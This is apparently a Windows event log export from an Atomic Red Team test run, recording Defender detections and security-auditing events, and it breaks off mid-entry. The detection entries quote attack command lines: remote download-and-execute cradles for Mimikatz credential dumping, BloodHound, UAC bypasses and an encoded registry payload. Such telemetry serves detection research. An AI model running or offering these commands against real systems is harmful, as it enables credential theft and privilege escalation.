+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Users
+	Group Name:		Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:41,Service Control Manager,7040,None,The start type of the Background Intelligent Transfer Service service was changed from demand start to auto start.
+Information,15/04/2020 14:41,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		DESKTOP-P8HTU4V$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Group:
+	Security ID:		BUILTIN\Administrators
+	Group Name:		Administrators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x1a0
+	Process Name:		C:\Windows\System32\svchost.exe"
+Information,15/04/2020 14:41,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		DESKTOP-P8HTU4V$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Group:
+	Security ID:		BUILTIN\Backup Operators
+	Group Name:		Backup Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x1a0
+	Process Name:		C:\Windows\System32\svchost.exe"
+Information,15/04/2020 14:41,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Powersploit.M&threatid=2147725349&enterprise=0
+ 	Name: Trojan:PowerShell/Powersploit.M
+ 	ID: 2147725349
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: file:_C:\AtomicRedTeam\atomics\T1056\src\Get-Keystrokes.ps1
+ 	Detection Origin: Local machine
+ 	Detection Type: Concrete
+ 	Detection Source: Real-Time Protection
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ 	Action: Quarantine
+ 	Action Status:  No additional actions required
+ 	Error Code: 0x00000000
+ 	Error description: The operation completed successfully. 
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:41,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
+Information,15/04/2020 14:41,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		DESKTOP-P8HTU4V$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Logon Information:
+	Logon Type:		5
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		Yes
+
+Impersonation Level:		Impersonation
+
+New Logon:
+	Security ID:		SYSTEM
+	Account Name:		SYSTEM
+	Account Domain:		NT AUTHORITY
+	Logon ID:		0x3E7
+	Linked Logon ID:		0x0
+	Network Account Name:	-
+	Network Account Domain:	-
+	Logon GUID:		{00000000-0000-0000-0000-000000000000}
+
+Process Information:
+	Process ID:		0x258
+	Process Name:		C:\Windows\System32\services.exe
+
+Network Information:
+	Workstation Name:	-
+	Source Network Address:	-
+	Source Port:		-
+
+Detailed Authentication Information:
+	Logon Process:		Advapi  
+	Authentication Package:	Negotiate
+	Transited Services:	-
+	Package Name (NTLM only):	-
+	Key Length:		0
+
+This event is generated when a logon session is created. It is generated on the computer that was accessed.
+
+The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.
+
+The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).
+
+The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.
+
+The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.
+
+The impersonation level field indicates the extent to which a process in the logon session can impersonate.
+
+The authentication information fields provide detailed information about this specific logon request.
+	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
+	- Transited services indicate which intermediate services have participated in this logon request.
+	- Package name indicates which sub-protocol was used among the NTLM protocols.
+	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
+Information,15/04/2020 14:41,Microsoft-Windows-Security-Auditing,4672,Special Logon,"Special privileges assigned to new logon.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		SYSTEM
+	Account Domain:		NT AUTHORITY
+	Logon ID:		0x3E7
+
+Privileges:		SeAssignPrimaryTokenPrivilege
+			SeTcbPrivilege
+			SeSecurityPrivilege
+			SeTakeOwnershipPrivilege
+			SeLoadDriverPrivilege
+			SeBackupPrivilege
+			SeRestorePrivilege
+			SeDebugPrivilege
+			SeAuditPrivilege
+			SeSystemEnvironmentPrivilege
+			SeImpersonatePrivilege
+			SeDelegateSessionUserImpersonatePrivilege"
+Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powessere.G&threatid=2147725444&enterprise=0
+ 	Name: Trojan:Win32/Powessere.G
+ 	ID: 2147725444
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c RUNDLL32 vbscript:PATH, RunHTMLApplication +String(CreateObject(WSCRIPT_SHELL).Run(CALCULATOR),0)
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:42,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
+{C2F03A33-21F5-47FA-B4BB-156362A2F239}
+ and APPID 
+{316CDED5-E4AE-4B15-9113-7055D84DCC97}
+ to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
+Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powessere.G&threatid=2147725444&enterprise=0
+ 	Name: Trojan:Win32/Powessere.G
+ 	ID: 2147725444
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c RUNDLL32 vbscript:PATH, RunHTMLApplication +String(CreateObject(WSCRIPT_SHELL).Run(CALCULATOR),0)
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:42,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
+Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0
+ 	Name: Trojan:PowerShell/Mimikatz.A
+ 	ID: 2147725502
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c PWS_EXECUTABLE IEX (New-Object Net.WebClient).DownloadString('GITHUB_MIMIKATZ_PWS'); Invoke-Mimikatz -DumpCreds
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:42,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
+{C2F03A33-21F5-47FA-B4BB-156362A2F239}
+ and APPID 
+{316CDED5-E4AE-4B15-9113-7055D84DCC97}
+ to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
+Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Sacepos.C&threatid=2147726248&enterprise=0
+ 	Name: Trojan:PowerShell/Sacepos.C
+ 	ID: 2147726248
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & {IEX (New-Object Net.WebClient).DownloadString('GITHUB_BLOODHOUNDAD_SHARPHOUND_PWS'); Invoke-BloodHound}
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0
+ 	Name: Trojan:PowerShell/Mimikatz.A
+ 	ID: 2147725502
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c PWS_EXECUTABLE IEX (New-Object Net.WebClient).DownloadString('GITHUB_MIMIKATZ_PWS'); Invoke-Mimikatz -DumpCreds
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Sacepos.C&threatid=2147726248&enterprise=0
+ 	Name: Trojan:PowerShell/Sacepos.C
+ 	ID: 2147726248
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c PWS_EXECUTABLE IEX (New-Object Net.WebClient).DownloadString('GITHUB_INVOKE_APP_BYPASS_PWS'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Kovter.L&threatid=2147752413&enterprise=0
+ 	Name: Trojan:Win32/Kovter.L
+ 	ID: 2147752413
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c CMD_EXECUTABL /c MSHTA_EXECUTABLE javascript:a=GetObject('script:GITHUB_ATOMICS_T1086').Exec();close()
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powessere.K&threatid=2147734747&enterprise=0
+ 	Name: Trojan:Win32/Powessere.K
+ 	ID: 2147734747
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & {# Encoded payload in next command is the following ""Set-Content -path ""$env:ART-MAKER_TEXT"" -value ""Hello from the Atomic Red Team"""" REG_EXECUTABLE add ""HKEY_AtomicRedTeam"" /v ART /t REG_SZ /d ""HASH="" iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU_SOFTWARE).ART)))}
+reg.exe add ""HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=""
+iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))}
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,5379,User Account Management,"Credential Manager credentials were read.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+	Read Operation:		Enumerate Credentials
+
+This event occurs when a user performs a read operation on stored credentials in Credential Manager."
+Warning,15/04/2020 14:42,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
+{C2F03A33-21F5-47FA-B4BB-156362A2F239}
+ and APPID 
+{316CDED5-E4AE-4B15-9113-7055D84DCC97}
+ to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Users
+	Group Name:		Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0xc5c
+	Process Name:		C:\Windows\System32\net1.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Users
+	Group Name:		Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Users
+	Group Name:		Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,5379,User Account Management,"Credential Manager credentials were read.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+	Read Operation:		Enumerate Credentials
+
+This event occurs when a user performs a read operation on stored credentials in Credential Manager."
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Access Control Assistance Operators
+	Group Name:		Access Control Assistance Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Administrators
+	Group Name:		Administrators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Backup Operators
+	Group Name:		Backup Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Cryptographic Operators
+	Group Name:		Cryptographic Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Device Owners
+	Group Name:		Device Owners
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Distributed COM Users
+	Group Name:		Distributed COM Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Event Log Readers
+	Group Name:		Event Log Readers
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Guests
+	Group Name:		Guests
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Hyper-V Administrators
+	Group Name:		Hyper-V Administrators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\IIS_IUSRS
+	Group Name:		IIS_IUSRS
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Network Configuration Operators
+	Group Name:		Network Configuration Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Performance Log Users
+	Group Name:		Performance Log Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Performance Monitor Users
+	Group Name:		Performance Monitor Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Power Users
+	Group Name:		Power Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Remote Desktop Users
+	Group Name:		Remote Desktop Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Remote Management Users
+	Group Name:		Remote Management Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Replicator
+	Group Name:		Replicator
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\System Managed Group
+	Group Name:		System Managed Accounts Group
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Users
+	Group Name:		Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x294
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Warning,15/04/2020 14:43,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Sobocat.A&threatid=2147733729&enterprise=0
+ 	Name: Trojan:Win32/Sobocat.A
+ 	ID: 2147733729
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c REG_EXECUTABLE add HCU_SOFTWARE /ve /d CMD>EXE /f & reg.exe add HCU_SOFTWARE  /v DelegateExecute & FODHELPER_EXECUTABLE
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:43,Service Control Manager,7040,None,The start type of the Background Intelligent Transfer Service service was changed from auto start to demand start.
+Warning,15/04/2020 14:43,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
+{C2F03A33-21F5-47FA-B4BB-156362A2F239}
+ and APPID 
+{316CDED5-E4AE-4B15-9113-7055D84DCC97}
+ to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
+Warning,15/04/2020 14:43,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
